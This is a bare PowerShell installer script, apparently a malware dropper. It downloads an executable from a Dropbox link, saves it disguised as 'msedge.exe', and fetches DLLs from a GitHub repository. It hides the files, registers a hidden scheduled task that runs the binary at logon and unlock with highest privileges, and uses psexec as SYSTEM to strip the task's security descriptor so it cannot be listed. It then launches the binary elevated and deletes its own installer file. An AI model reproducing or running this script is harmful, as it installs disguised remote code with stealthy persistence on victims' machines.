cd $env:temp

mkdir sVBXKuz

cd sVBXKuz

Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/h1w1j8ailp97p2c8yogav/wsappa-2.0.exe?rlkey=4hpnkpmpdtjbfa995n4pytrs6&dl=0" -OutFile msedge.exe
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll

$filePath = "$env:temp/sVBXKuz/msedge.exe"
$dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
$dll2Path = "$env:temp/sVBXKuz/libopus.dll"
$folderPath = "$env:temp/sVBXKuz/"

Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)

$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\msedge.exe'
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10

$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-08-09T11:59:58.6674267</Date>
    <Author>$env:computername\$env:username</Author>
    <URI>\dauto</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>SessionUnlock</StateChange>
    </SessionStateChangeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>DOMAIN\$env:UserName</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT5M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\msedge.exe</Command>
    </Exec>    
  </Actions>
</Task>
"@

$taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")

Register-ScheduledTask -Xml $taskXml -TaskName 'dauto' -Force

Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe"
.\psexec.exe /accepteula -i -s powershell -Command "Rename-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\dauto' -Name 'SD' -NewName 'SD832'"
Remove-item psexec.exe

Start-Process $env:temp/sVBXKuz/msedge.exe -Verb RunAs

powershell.exe /c Remove-Item $env:temp/dinstall.ps1

exit
